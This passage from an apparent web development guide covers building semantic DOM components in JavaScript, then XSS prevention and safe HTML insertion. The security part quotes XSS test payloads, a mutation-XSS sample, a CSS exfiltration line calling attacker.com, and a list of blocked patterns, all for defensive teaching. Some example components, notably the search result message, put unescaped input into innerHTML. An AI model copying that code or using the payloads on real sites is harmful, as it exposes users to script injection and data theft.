  
  createTab(tab, index) {
    const button = document.createElement('button');
    button.id = `tab-${index}`;
    button.setAttribute('role', 'tab');
    button.setAttribute('aria-selected', index === 0 ? 'true' : 'false');
    button.setAttribute('aria-controls', `panel-${index}`);
    button.textContent = tab.label;
    button.tabIndex = index === 0 ? 0 : -1;
    
    const panel = document.createElement('div');
    panel.id = `panel-${index}`;
    panel.setAttribute('role', 'tabpanel');
    panel.setAttribute('aria-labelledby', button.id);
    panel.hidden = index !== 0;
    panel.innerHTML = tab.content;
    
    button.addEventListener('click', () => this.selectTab(index));
    
    this.tablist.appendChild(button);
    this.panels.push(panel);
  }
  
  selectTab(index) {
    const buttons = this.tablist.querySelectorAll('[role="tab"]');
    buttons.forEach((btn, i) => {
      const selected = i === index;
      btn.setAttribute('aria-selected', selected);
      btn.tabIndex = selected ? 0 : -1;
      this.panels[i].hidden = !selected;
    });
  }
  
  getElement() {
    return this.container;
  }
}
```

### Dialog and Modal Patterns

Create modal dialogs that maintain semantic focus management:

```javascript
// Semantic modal dialog
class SemanticDialog {
  constructor(config) {
    this.dialog = document.createElement('div');
    this.dialog.setAttribute('role', 'dialog');
    this.dialog.setAttribute('aria-modal', 'true');
    this.dialog.setAttribute('aria-labelledby', 'dialog-title');
    this.dialog.hidden = true;
    
    const title = document.createElement('h2');
    title.id = 'dialog-title';
    title.textContent = config.title;
    
    const content = document.createElement('div');
    content.innerHTML = config.content;
    
    const actions = document.createElement('div');
    actions.setAttribute('role', 'group');
    actions.setAttribute('aria-label', 'Dialog actions');
    
    const closeBtn = document.createElement('button');
    closeBtn.textContent = 'Close';
    closeBtn.addEventListener('click', () => this.close());
    actions.appendChild(closeBtn);
    
    this.dialog.append(title, content, actions);
    this.previousFocus = null;
  }
  
  open() {
    this.previousFocus = document.activeElement;
    this.dialog.hidden = false;
    
    // Focus first focusable element
    const focusable = this.dialog.querySelector('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])');
    if (focusable) focusable.focus();
    
    // Trap focus
    this.dialog.addEventListener('keydown', this.trapFocus.bind(this));
  }
  
  close() {
    this.dialog.hidden = true;
    if (this.previousFocus) {
      this.previousFocus.focus();
    }
  }
  
  trapFocus(e) {
    if (e.key !== 'Tab') return;
    
    const focusable = Array.from(
      this.dialog.querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])')
    );
    
    const first = focusable[0];
    const last = focusable[focusable.length - 1];
    
    if (e.shiftKey && document.activeElement === first) {
      e.preventDefault();
      last.focus();
    } else if (!e.shiftKey && document.activeElement === last) {
      e.preventDefault();
      first.focus();
    }
  }
  
  getElement() {
    return this.dialog;
  }
}
```

### Progressive Enhancement Strategies

Layer semantic HTML with JavaScript enhancements while preserving baseline functionality:

```javascript
// Progressive enhancement pattern
function enhanceElement(element) {
  // Check if already enhanced
  if (element.dataset.enhanced === 'true') return;
  
  // Preserve semantic HTML baseline
  const baseContent = element.cloneNode(true);
  
  // Add enhancements
  if (element.matches('[data-enhance="accordion"]')) {
    enhanceAsAccordion(element);
  } else if (element.matches('[data-enhance="tabs"]')) {
    enhanceAsTabs(element);
  }
  
  element.dataset.enhanced = 'true';
  
  // Store baseline for fallback
  element.dataset.baseline = baseContent.outerHTML;
}

function enhanceAsAccordion(element) {
  const sections = element.querySelectorAll('section');
  sections.forEach((section, index) => {
    const heading = section.querySelector('h2, h3, h4, h5, h6');
    if (!heading) return;
    
    const button = document.createElement('button');
    button.textContent = heading.textContent;
    button.setAttribute('aria-expanded', 'false');
    button.setAttribute('aria-controls', `section-${index}`);
    
    const content = document.createElement('div');
    content.id = `section-${index}`;
    content.innerHTML = section.innerHTML.replace(heading.outerHTML, '');
    content.hidden = true;
    
    section.innerHTML = '';
    heading.innerHTML = '';
    heading.appendChild(button);
    section.append(heading, content);
    
    button.addEventListener('click', () => {
      const expanded = button.getAttribute('aria-expanded') === 'true';
      button.setAttribute('aria-expanded', !expanded);
      content.hidden = expanded;
    });
  });
}
```

### Data Attributes for Semantic Context

Use data attributes to maintain semantic relationships in dynamic content:

```javascript
// Semantic data relationships
function createRelatedContent(mainContent, related) {
  const article = document.createElement('article');
  article.id = mainContent.id;
  article.dataset.contentType = mainContent.type;
  article.dataset.published = mainContent.date;
  
  const header = document.createElement('header');
  const h2 = document.createElement('h2');
  h2.textContent = mainContent.title;
  header.appendChild(h2);
  
  const content = document.createElement('div');
  content.innerHTML = mainContent.body;
  
  article.append(header, content);
  
  if (related.length > 0) {
    const aside = document.createElement('aside');
    aside.setAttribute('aria-labelledby', 'related-heading');
    aside.dataset.relatesTo = mainContent.id;
    
    const heading = document.createElement('h3');
    heading.id = 'related-heading';
    heading.textContent = 'Related Articles';
    
    const list = document.createElement('ul');
    related.forEach(item => {
      const li = document.createElement('li');
      const a = document.createElement('a');
      a.href = item.url;
      a.dataset.relationType = 'related';
      a.textContent = item.title;
      li.appendChild(a);
      list.appendChild(li);
    });
    
    aside.append(heading, list);
    article.appendChild(aside);
  }
  
  return article;
}
```

### Figure and Media Elements

Properly structure media content with semantic associations:

```javascript
// Semantic media handling
function createFigure(config) {
  const figure = document.createElement('figure');
  
  if (config.type === 'image') {
    const img = document.createElement('img');
    img.src = config.src;
    img.alt = config.alt;
    if (config.width) img.width = config.width;
    if (config.height) img.height = config.height;
    figure.appendChild(img);
  } else if (config.type === 'video') {
    const video = document.createElement('video');
    video.controls = true;
    video.preload = 'metadata';
    
    const source = document.createElement('source');
    source.src = config.src;
    source.type = config.mimeType;
    video.appendChild(source);
    
    if (config.tracks) {
      config.tracks.forEach(track => {
        const trackEl = document.createElement('track');
        trackEl.kind = track.kind;
        trackEl.src = track.src;
        trackEl.srclang = track.lang;
        trackEl.label = track.label;
        if (track.default) trackEl.default = true;
        video.appendChild(trackEl);
      });
    }
    
    figure.appendChild(video);
  }
  
  if (config.caption) {
    const figcaption = document.createElement('figcaption');
    figcaption.textContent = config.caption;
    figure.appendChild(figcaption);
  }
  
  return figure;
}
```

### Breadcrumb Navigation

Construct semantic breadcrumb trails:

```javascript
// Semantic breadcrumbs
function createBreadcrumbs(path) {
  const nav = document.createElement('nav');
  nav.setAttribute('aria-label', 'Breadcrumb');
  
  const ol = document.createElement('ol');
  ol.setAttribute('role', 'list'); // Some screen readers need explicit role
  
  path.forEach((item, index) => {
    const li = document.createElement('li');
    
    if (index < path.length - 1) {
      const a = document.createElement('a');
      a.href = item.url;
      a.textContent = item.label;
      li.appendChild(a);
    } else {
      const span = document.createElement('span');
      span.setAttribute('aria-current', 'page');
      span.textContent = item.label;
      li.appendChild(span);
    }
    
    ol.appendChild(li);
  });
  
  nav.appendChild(ol);
  return nav;
}
```

### Search Interface Pattern

Build semantic search functionality:

```javascript
// Semantic search component
class SemanticSearch {
  constructor(config) {
    this.container = document.createElement('div');
    this.container.setAttribute('role', 'search');
    
    const form = document.createElement('form');
    form.setAttribute('role', 'search');
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      this.performSearch();
    });
    
    const label = document.createElement('label');
    label.setAttribute('for', 'search-input');
    label.textContent = config.label || 'Search';
    
    const input = document.createElement('input');
    input.id = 'search-input';
    input.type = 'search';
    input.name = 'q';
    input.setAttribute('aria-describedby', 'search-desc');
    input.autocomplete = 'off';
    
    const description = document.createElement('span');
    description.id = 'search-desc';
    description.className = 'visually-hidden';
    description.textContent = 'Enter search terms';
    
    const button = document.createElement('button');
    button.type = 'submit';
    button.textContent = 'Search';
    
    this.resultsContainer = document.createElement('div');
    this.resultsContainer.id = 'search-results';
    this.resultsContainer.setAttribute('role', 'region');
    this.resultsContainer.setAttribute('aria-live', 'polite');
    this.resultsContainer.setAttribute('aria-atomic', 'false');
    
    form.append(label, input, description, button);
    this.container.append(form, this.resultsContainer);
    
    this.input = input;
    this.onSearch = config.onSearch;
  }
  
  async performSearch() {
    const query = this.input.value.trim();
    if (!query) return;
    
    this.resultsContainer.innerHTML = '<p>Searching...</p>';
    
    const results = await this.onSearch(query);
    this.displayResults(results, query);
  }
  
  displayResults(results, query) {
    if (results.length === 0) {
      this.resultsContainer.innerHTML = `<p>No results found for "${query}"</p>`;
      return;
    }
    
    const heading = document.createElement('h2');
    heading.textContent = `${results.length} result${results.length !== 1 ? 's' : ''} for "${query}"`;
    
    const list = document.createElement('ul');
    results.forEach(result => {
      const li = document.createElement('li');
      
      const article = document.createElement('article');
      
      const h3 = document.createElement('h3');
      const link = document.createElement('a');
      link.href = result.url;
      link.textContent = result.title;
      h3.appendChild(link);
      
      const snippet = document.createElement('p');
      snippet.textContent = result.snippet;
      
      article.append(h3, snippet);
      li.appendChild(article);
      list.appendChild(li);
    });
    
    this.resultsContainer.innerHTML = '';
    this.resultsContainer.append(heading, list);
  }
  
  getElement() {
    return this.container;
  }
}
```

### Address and Contact Information

Format contact details semantically:

```javascript
// Semantic contact information
function createContactInfo(contact) {
  const address = document.createElement('address');
  
  if (contact.name) {
    const name = document.createElement('strong');
    name.textContent = contact.name;
    address.appendChild(name);
    address.appendChild(document.createElement('br'));
  }
  
  if (contact.street) {
    address.appendChild(document.createTextNode(contact.street));
    address.appendChild(document.createElement('br'));
  }
  
  if (contact.city || contact.state || contact.zip) {
    address.appendChild(document.createTextNode(
      `${contact.city}, ${contact.state} ${contact.zip}`
    ));
    address.appendChild(document.createElement('br'));
  }
  
  if (contact.email) {
    const email = document.createElement('a');
    email.href = `mailto:${contact.email}`;
    email.textContent = contact.email;
    address.appendChild(email);
    address.appendChild(document.createElement('br'));
  }
  
  if (contact.phone) {
    const phone = document.createElement('a');
    phone.href = `tel:${contact.phone.replace(/\D/g, '')}`;
    phone.textContent = contact.phone;
    address.appendChild(phone);
  }
  
  return address;
}
```

### Citation and Quotation Elements

Handle citations semantically:

```javascript
// Semantic citations
function createBlockquote(config) {
  const blockquote = document.createElement('blockquote');
  
  if (config.cite) {
    blockquote.cite = config.cite;
  }
  
  const p = document.createElement('p');
  p.textContent = config.quote;
  blockquote.appendChild(p);
  
  if (config.source || config.author) {
    const footer = document.createElement('footer');
    
    if (config.author) {
      footer.appendChild(document.createTextNode('— '));
      const cite = document.createElement('cite');
      cite.textContent = config.author;
      footer.appendChild(cite);
    }
    
    if (config.source) {
      if (config.author) {
        footer.appendChild(document.createTextNode(', '));
      }
      const sourceLink = document.createElement('a');
      sourceLink.href = config.cite || '#';
      sourceLink.textContent = config.source;
      footer.appendChild(sourceLink);
    }
    
    blockquote.appendChild(footer);
  }
  
  return blockquote;
}

function createInlineQuote(text, cite) {
  const q = document.createElement('q');
  q.textContent = text;
  if (cite) {
    q.cite = cite;
  }
  return q;
}
```

### Measurement and Technical Data

Format technical values semantically:

```javascript
// Semantic data representation
function createDataDisplay(label, value, unit) {
  const dl = document.createElement('dl');
  
  const dt = document.createElement('dt');
  dt.textContent = label;
  
  const dd = document.createElement('dd');
  
  const data = document.createElement('data');
  data.value = value;
  data.textContent = `${value} ${unit}`;
  
  dd.appendChild(data);
  dl.append(dt, dd);
  
  return dl;
}

function createMeasurement(value, unit) {
  const span = document.createElement('span');
  span.textContent = `${value} `;
  
  const abbr = document.createElement('abbr');
  abbr.title = getFullUnit(unit); // [Inference] Assumes helper function exists
  abbr.textContent = unit;
  
  span.appendChild(abbr);
  return span;
}
```

### Template Elements and Cloning

Use template elements for reusable semantic structures:

```javascript
// Template-based semantic content
class SemanticTemplate {
  constructor(templateId) {
    this.template = document.getElementById(templateId);
    if (!this.template || this.template.tagName !== 'TEMPLATE') {
      throw new Error('Invalid template element');
    }
  }
  
  create(data) {
    const clone = this.template.content.cloneNode(true);
    
    // Populate semantic elements
    Object.entries(data).forEach(([key, value]) => {
      const element = clone.querySelector(`[data-field="${key}"]`);
      if (!element) return;
      
      if (element.matches('img')) {
        element.src = value;
      } else if (element.matches('a')) {
        element.href = value;
      } else if (element.matches('time')) {
        element.setAttribute('datetime', value);
        element.textContent = new Date(value).toLocaleDateString();
      } else {
        element.textContent = value;
      }
    });
    
    return clone;
  }
}

// Usage with semantic template
// <template id="article-template">
//   <article>
//     <header>
//       <h3 data-field="title"></h3>
//       <time data-field="published"></time>
//     </header>
//     <p data-field="excerpt"></p>
//   </article>
// </template>

const articleTemplate = new SemanticTemplate('article-template');
const article = articleTemplate.create({
  title: 'Article Title',
  published: '2025-12-15',
  excerpt: 'Article excerpt text'
});
```

### Skip Links and Keyboard Navigation

Implement navigation aids programmatically:

```javascript
// Skip links for accessibility
function createSkipLinks(targets) {
  const nav = document.createElement('nav');
  nav.className = 'skip-links';
  nav.setAttribute('aria-label', 'Skip links');
  
  const list = document.createElement('ul');
  
  targets.forEach(target => {
    const li = document.createElement('li');
    const a = document.createElement('a');
    a.href = `#${target.id}`;
    a.textContent = target.label;
    a.className = 'skip-link';
    li.appendChild(a);
    list.appendChild(li);
  });
  
  nav.appendChild(list);
  
  // Insert at beginning of body
  document.body.insertBefore(nav, document.body.firstChild);
}

// Add skip targets
function makeSkipTarget(element, label) {
  if (!element.id) {
    element.id = `skip-${label.toLowerCase().replace(/\s+/g, '-')}`;
  }
  element.setAttribute('tabindex', '-1'); // Allow programmatic focus
}
```

### Microdata and Schema.org Integration

Enhance semantic meaning with structured data:

```javascript
// Schema.org structured data
function createProductMarkup(product) {
  const article = document.createElement('article');
  article.setAttribute('itemscope', '');
  article.setAttribute('itemtype', 'https://schema.org/Product');
  
  const name = document.createElement('h2');
  name.setAttribute('itemprop', 'name');
  name.textContent = product.name;
  
  const description = document.createElement('p');
  description.setAttribute('itemprop', 'description');
  description.textContent = product.description;
  
  const offer = document.createElement('div');
  offer.setAttribute('itemprop', 'offers');
  offer.setAttribute('itemscope', '');
  offer.setAttribute('itemtype', 'https://schema.org/Offer');
  
  const price = document.createElement('span');
  price.setAttribute('itemprop', 'price');
  price.setAttribute('content', product.price);
  price.textContent = `$${product.price}`;
  
  const currency = document.createElement('meta');
  currency.setAttribute('itemprop', 'priceCurrency');
  currency.content = 'USD';
  
  offer.append(price, currency);
  article.append(name, description, offer);
  
  return article;
}
```

This comprehensive coverage focuses on practical implementation patterns for maintaining semantic HTML integrity when building or manipulating DOM structures with JavaScript.

---

# Security Considerations

## XSS Prevention

### Context-Aware Output Encoding

Output encoding must match the specific context where user data appears. Each context has distinct metacharacters and encoding requirements.

#### HTML Context Encoding

For data inserted into HTML body content, encode `&`, `<`, `>`, `"`, `'`, and `/`. Use HTML entity encoding: `&` becomes `&amp;`, `<` becomes `&lt;`, `>` becomes `&gt;`, `"` becomes `&quot;`, `'` becomes `&#x27;`, `/` becomes `&#x2F;`.

#### HTML Attribute Context

When inserting data into HTML attributes, always use quoted attributes. Unquoted attributes are difficult to encode securely. Apply HTML entity encoding to all ASCII values less than 256 with the `&#xHH;` format, except alphanumerics. For safe attribute contexts like `class`, `id`, standard HTML encoding suffices. For event handlers or dangerous attributes, avoid user input entirely.

#### JavaScript Context Encoding

For data placed inside JavaScript strings, encode all non-alphanumeric characters using Unicode escaping `\xHH` for ASCII or `\uHHHH` for Unicode. Never insert untrusted data into dangerous contexts like executable JavaScript code outside strings, event handler attributes, or JavaScript URLs (`javascript:`).

#### CSS Context Encoding

Encode all non-alphanumeric characters to `\HH` hex format. Avoid placing untrusted data in CSS property values that accept `url()`, `expression()`, or `behavior()` functions, as these can execute JavaScript.

#### URL Context Encoding

Use URL encoding (percent-encoding) for data inserted into URL parameters. Validate that URLs begin with safe protocols (`http:`, `https:`). Block `javascript:`, `data:`, `vbscript:`, and other executable protocols. Apply standard URL encoding for query parameters and fragments.

### Content Security Policy (CSP)

CSP provides defense-in-depth by restricting resource loading and script execution through HTTP headers or meta tags.

#### Core Directives

`default-src` establishes the fallback policy for all resource types. `script-src` controls JavaScript execution sources. `style-src` governs CSS sources. `img-src`, `font-src`, `connect-src`, `media-src`, `object-src`, `frame-src` control their respective resource types.

#### Script Execution Control

`script-src 'none'` blocks all scripts. `script-src 'self'` allows only same-origin scripts. `script-src 'unsafe-inline'` permits inline scripts but weakens protection significantly. `script-src 'unsafe-eval'` allows `eval()` and related constructs, which should be avoided.

Nonces provide stronger inline script control: `script-src 'nonce-{random}'` allows only scripts with matching `nonce` attributes. Generate cryptographically random nonces per request. Hashes allow specific inline scripts: `script-src 'sha256-{hash}'` permits scripts matching the hash.

#### Strict CSP Patterns

Strict CSP eliminates `'unsafe-inline'` by using nonces or hashes exclusively. Combined with `'strict-dynamic'`, scripts loaded by trusted scripts are also trusted, while blocking parser-inserted scripts. Pattern: `script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'none';`.

#### CSP Reporting

`report-uri` or `report-to` directives send violation reports to specified endpoints. `Content-Security-Policy-Report-Only` header enables testing without enforcement, reporting violations while allowing them to execute.

### Input Validation

Input validation reduces attack surface but does not replace output encoding.

#### Allowlist Validation

Define expected input patterns and reject anything outside them. For alphanumeric identifiers, accept only `[a-zA-Z0-9_-]`. For email addresses, use strict format validation. For URLs, parse and validate protocol, domain, and path components.

#### Length Restrictions

Enforce maximum input lengths appropriate to the field's purpose. Excessive length inputs may indicate attack payloads.

#### Type Validation

Validate that inputs match expected data types. Numeric fields should parse as numbers. Date fields should parse as valid dates. Enum fields should match predefined sets.

#### Dangerous Pattern Blocking

Block inputs containing `<script`, `javascript:`, `onerror=`, `onload=`, and other XSS indicators. [Inference: This provides additional defense but can be bypassed through encoding variations and should not be the primary defense mechanism.]

### Framework-Specific Protections

#### React

React escapes values embedded in JSX by default. `{userInput}` is automatically escaped. `dangerouslySetInnerHTML` bypasses escaping and should only receive sanitized HTML. Never pass user input directly to `dangerouslySetInnerHTML`.

#### Angular

Angular's template binding escapes values automatically. Property binding `[property]="value"` and interpolation `{{value}}` are safe. The `bypassSecurityTrustHtml`, `bypassSecurityTrustScript`, `bypassSecurityTrustUrl` methods disable sanitization and require extreme caution.

#### Vue

Vue templates escape interpolated values `{{value}}` automatically. The `v-html` directive renders raw HTML and requires sanitized input. Never bind user input directly to `v-html`.

#### Server-Side Frameworks

Template engines like Jinja2, EJS, Handlebars typically auto-escape by default. Verify the framework's escaping behavior and opt into auto-escaping if not default. Raw output filters (`|safe`, `{{{triple-braces}}}`, `<%- %>`) bypass escaping and require sanitized inputs.

### DOM-Based XSS Prevention

DOM-based XSS occurs when client-side JavaScript writes user-controllable data to dangerous DOM sinks.

#### Dangerous Sinks

`eval()`, `setTimeout(string)`, `setInterval(string)` execute strings as code. `Function()` constructor creates executable code from strings. `element.innerHTML`, `element.outerHTML` parse HTML and execute embedded scripts. `document.write()`, `document.writeln()` insert content that the parser evaluates. `element.insertAdjacentHTML()` parses HTML content. URL assignment to `location`, `location.href`, `location.replace()` can execute `javascript:` URLs. `script.src`, `script.text`, `script.textContent` create executable scripts.

#### Safe Alternatives

Use `textContent` or `innerText` instead of `innerHTML` for plain text. Use `setAttribute()` instead of direct property assignment for attributes. Use `createElement()` and `appendChild()` to construct DOM structures programmatically. Parse JSON with `JSON.parse()` instead of `eval()`. Use `setTimeout(function)` with a function reference instead of string code.

#### URL Handling

Validate URL protocols before assignment. Check that `url.startsWith('http:')` or `url.startsWith('https:')` before assigning to `location` or similar properties. Use URL parser (`new URL()`) to validate structure and extract components safely.

#### Sources of Tainted Data

`location.hash`, `location.search`, `document.referrer`, `document.URL`, `window.name` contain user-controllable data. `postMessage` event data comes from other windows. Any data retrieved from storage (`localStorage`, `sessionStorage`, `IndexedDB`) may have been tainted previously.

### HTTP Response Headers

#### X-Content-Type-Options

`X-Content-Type-Options: nosniff` blocks MIME-sniffing, preventing browsers from interpreting files as different types than declared. This prevents treating uploaded user files as HTML/JavaScript.

#### X-Frame-Options

`X-Frame-Options: DENY` blocks all framing. `X-Frame-Options: SAMEORIGIN` allows only same-origin framing. This mitigates some clickjacking-assisted XSS scenarios.

#### Referrer-Policy

Controls how much referrer information is sent. `Referrer-Policy: no-referrer` sends no referrer. `Referrer-Policy: strict-origin-when-cross-origin` sends only origin for cross-origin requests. Reduces leakage of sensitive data in URLs.

### Sanitization Libraries

When HTML input is required (rich text editors), sanitization libraries parse and clean HTML to remove dangerous elements and attributes.

#### DOMPurify

Client-side HTML sanitizer. Configurable allowlists for tags and attributes. Removes script-executing constructs while preserving safe HTML structure. Use before assigning to `innerHTML` or similar sinks.

#### Bleach (Python)

Server-side HTML sanitizer. Allowlist-based tag and attribute filtering. Integrates with Django and other frameworks.

#### OWASP Java HTML Sanitizer

Java library for HTML sanitization. Policy-based configuration for allowed elements and attributes.

#### Configuration Principles

Default to strict allowlists. Only permit tags necessary for functionality (`<p>`, `<strong>`, `<em>`, `<ul>`, `<li>`, `<a>`). Carefully control attributes, especially `href`, `src`, `style`. Block or sanitize `style` attributes to prevent CSS-based attacks. Validate URLs in `href` and `src` attributes.

[Inference: Sanitization libraries reduce risk but may contain bypasses. They work best as part of layered defense with CSP and output encoding.]

### Cookie Security

Cookies containing authentication tokens or session identifiers are high-value XSS targets.

#### HttpOnly Flag

`Set-Cookie: session=...; HttpOnly` makes cookies inaccessible to JavaScript via `document.cookie`. XSS cannot steal HttpOnly cookies directly, though attackers can still perform actions as the user.

#### Secure Flag

`Set-Cookie: session=...; Secure` transmits cookies only over HTTPS. Combined with HttpOnly: `Set-Cookie: session=...; HttpOnly; Secure`.

#### SameSite Attribute

`SameSite=Strict` sends cookies only for same-site requests. `SameSite=Lax` sends cookies for top-level navigation but not cross-site subrequests. `SameSite=None; Secure` allows cross-site cookie transmission (requires Secure flag). SameSite provides CSRF protection and limits cookie exposure to XSS on different origins.

### Subresource Integrity (SRI)

SRI verifies that resources loaded from CDNs haven't been tampered with.

#### Implementation

Add `integrity` attribute to `<script>` and `<link>` tags: `<script src="https://cdn.example.com/library.js" integrity="sha384-{hash}" crossorigin="anonymous"></script>`. The browser computes the hash of the downloaded file and compares it to the `integrity` value. Mismatches block execution.

#### Hash Generation

Generate SRI hashes using tools or command line: `openssl dgst -sha384 -binary file.js | openssl base64 -A`. Modern build tools can generate SRI hashes automatically.

#### Multiple Hashes

Include multiple hash algorithms for fallback: `integrity="sha384-{hash} sha512-{hash}"`.

[Inference: SRI protects against CDN compromise and network-level tampering but requires hash updates when libraries change.]

### Template Injection Prevention

Server-side template injection can lead to XSS when user input is embedded in template code.

#### Template Language Isolation

Never construct template strings by concatenating user input: `template = "Hello " + username` creates injection risk. Pass user data as template variables instead: `render(template, {"username": username})`.

#### Sandboxed Template Evaluation

Use templates with restricted evaluation contexts. Avoid templates that allow arbitrary code execution. Configure template engines to disable dangerous features like filesystem access or command execution.

### API Response Security

APIs returning JSON or other formats must prevent XSS when consumed by web applications.

#### Content-Type Headers

Set correct `Content-Type` for JSON responses: `Content-Type: application/json`. Never use `text/html` for JSON data. Browsers treat `text/html` as renderable, potentially executing embedded scripts.

#### X-Content-Type-Options

Include `X-Content-Type-Options: nosniff` to enforce declared Content-Type.

#### JSON Encoding

Encode JSON responses properly. Escape `<`, `>`, `&`, and Unicode line/paragraph separators (`\u2028`, `\u2029`). Some JSON libraries don't escape `<script>` patterns by default, which can cause issues if JSON is embedded in HTML.

#### JSONP Deprecation

JSONP allows script tag injection by design. Avoid JSONP entirely. Use CORS for cross-origin API access instead.

### Browser Feature Detection and Polyfills

Older browsers lack modern security features like CSP or SameSite cookies.

#### Feature Detection

Detect CSP support via `document.securityPolicy` or similar APIs. Detect SameSite cookie support by checking user agent or using test cookies.

#### Graceful Degradation

[Inference: When security features aren't available, compensatory controls become more critical.] Strengthen output encoding. Implement server-side validation more strictly. Add additional layers of authentication.

#### Polyfill Security

Verify integrity of polyfill sources. Use SRI for polyfill scripts. Prefer official polyfill services with security track records.

### Testing and Verification

#### Automated Scanning

Use tools like OWASP ZAP, Burp Suite, or dedicated XSS scanners to test applications. These tools inject common XSS payloads and monitor for successful execution.

#### Manual Testing

Test encoding in all contexts: HTML body, attributes, JavaScript strings, CSS, URLs. Test with varied payloads: `<script>alert(1)</script>`, `"><script>alert(1)</script>`, `';alert(1);//`, `javascript:alert(1)`, `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`.

#### CSP Testing

Use `Content-Security-Policy-Report-Only` header during development to identify violations without breaking functionality. Monitor CSP reports for legitimate functionality that needs allowlisting.

#### Penetration Testing

Engage security professionals to perform comprehensive XSS testing, including advanced techniques like mutation-based XSS, encoding bypasses, and framework-specific exploits.

### Advanced Attack Vectors

#### Mutation XSS (mXSS)

Browser HTML parsing quirks can transform sanitized input into executable code. Example: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` may bypass sanitizers when the browser parses it in different contexts.

#### Encoding-Based Bypasses

Attackers use HTML entity encoding, URL encoding, Unicode encoding, or mixed encoding to bypass filters. `<script>` becomes `&lt;script&gt;`, `%3Cscript%3E`, `\u003cscript\u003e`, or combinations.

#### Polyglot Payloads

Payloads valid in multiple contexts simultaneously. A polyglot might work as both valid JavaScript and HTML, bypassing context-specific filters.

#### DOM Clobbering

HTML elements with `id` or `name` attributes create global JavaScript variables. `<img id="userDetails">` creates `window.userDetails`. If code expects `userDetails` to be an object with properties, the img element can break logic or enable XSS.

#### CSS Injection

Though not traditional XSS, CSS can exfiltrate data via background images with attribute selectors: `input[value^="a"] { background: url(https://attacker.com/a); }`. This can steal CSRF tokens or other sensitive input values.

#### Prototype Pollution

Manipulating JavaScript object prototypes can alter application behavior. Combined with vulnerable sinks, this enables XSS. Example: polluting `Object.prototype.innerHTML` might affect DOM manipulation code.

### Defense in Depth Strategy

Layered security provides protection if any single control fails.

#### Primary Defense

Context-aware output encoding at the point where user data enters each context. This is the most critical control.

#### Secondary Defense

Input validation reduces attack surface and blocks obvious attack attempts. Provides early warning but cannot catch all encoding variations.

#### Tertiary Defense

CSP restricts damage if XSS occurs by limiting script execution and resource loading.

#### Additional Layers

HttpOnly cookies limit credential theft. SRI protects third-party resources. Security headers like X-Content-Type-Options add specific protections.

[Inference: Multiple defense layers compensate for potential bypasses or implementation errors in any single control. A successful attack typically requires defeating multiple controls.]

---

## Safe HTML Insertion

### Direct DOM Manipulation Risks

When inserting HTML content into the DOM, the primary security concern is Cross-Site Scripting (XSS). Untrusted HTML can contain malicious scripts that execute in the user's browser context, potentially stealing credentials, session tokens, or performing unauthorized actions.

**High-risk patterns:**

- `element.innerHTML = userContent`
- `document.write(userContent)`
- `element.outerHTML = userContent`
- `insertAdjacentHTML()` with untrusted content

These methods parse HTML strings and execute any embedded scripts, event handlers, or JavaScript URLs.

### Safe Insertion Methods

#### textContent for Plain Text

The safest approach when you don't need HTML formatting:

```javascript
element.textContent = userInput;
```

This treats all content as plain text. Special characters like `<`, `>`, `&` are automatically escaped and displayed literally rather than interpreted as HTML. Scripts cannot execute because no HTML parsing occurs.

#### createElement with Controlled Attributes

Building DOM nodes programmatically:

```javascript
const div = document.createElement('div');
div.textContent = userContent;
div.className = sanitizedClassName;
div.setAttribute('data-id', userId);
parent.appendChild(div);
```

This approach constructs elements explicitly, allowing precise control over each attribute and preventing injection through HTML parsing.

#### Document Fragments for Complex Structures

When building multiple elements:

```javascript
const fragment = document.createDocumentFragment();
items.forEach(item => {
  const li = document.createElement('li');
  li.textContent = item.name;
  fragment.appendChild(li);
});
list.appendChild(fragment);
```

Document fragments batch DOM operations and avoid reflows while maintaining safety through programmatic construction.

### HTML Sanitization Libraries

When you must accept HTML input, use dedicated sanitization libraries that parse and clean HTML according to security policies.

#### DOMPurify

The most widely-adopted sanitization library:

```javascript
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirtyHTML);
element.innerHTML = clean;
```

**Configuration options:**

```javascript
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false,
  KEEP_CONTENT: true,
  RETURN_DOM: false,
  RETURN_DOM_FRAGMENT: false
});
```

**What DOMPurify removes:**

- `<script>` tags and their content
- Event handlers (`onclick`, `onerror`, `onload`, etc.)
- JavaScript URLs (`javascript:`, `data:text/html`)
- Dangerous attributes (`formaction`, `form`)
- SVG/MathML elements that can execute scripts
- CSS expressions and behaviors
- Object, embed, and applet elements

**Hook system for custom processing:**

```javascript
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.hasAttribute('target')) {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});
```

#### sanitize-html (Node.js/Server-side)

For server-side sanitization:

```javascript
const sanitizeHtml = require('sanitize-html');

const clean = sanitizeHtml(dirty, {
  allowedTags: ['b', 'i', 'em', 'strong', 'a'],
  allowedAttributes: {
    'a': ['href']
  },
  allowedSchemes: ['http', 'https', 'mailto']
});
```

### Content Security Policy Integration

CSP headers provide defense-in-depth by restricting script execution even if sanitization fails:

```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-{random}'; 
  object-src 'none'; 
  base-uri 'self';
```

**Key directives for HTML insertion safety:**

- `script-src`: Controls which scripts can execute (use nonces or hashes, avoid `'unsafe-inline'`)
- `object-src 'none'`: Prevents plugins like Flash
- `base-uri 'self'`: Prevents `<base>` tag injection that could redirect relative URLs
- `require-trusted-types-for 'script'`: Enforces Trusted Types API

### Trusted Types API

Modern browsers support Trusted Types, which enforce that only sanitized values can be assigned to injection sinks:

```javascript
// Define a policy
const escapePolicy = trustedTypes.createPolicy('escapePolicy', {
  createHTML: (string) => DOMPurify.sanitize(string)
});

// Use the policy
element.innerHTML = escapePolicy.createHTML(userInput);
```

**Without a policy in strict mode:**

```javascript
// This throws a TypeError when Trusted Types are enforced
element.innerHTML = userInput; // TypeError: Failed to set innerHTML
```

**CSP header to enforce:**

```
Content-Security-Policy: require-trusted-types-for 'script'
```

[Inference] This prevents accidental unsafe assignments by forcing all innerHTML/outerHTML assignments through declared policies.

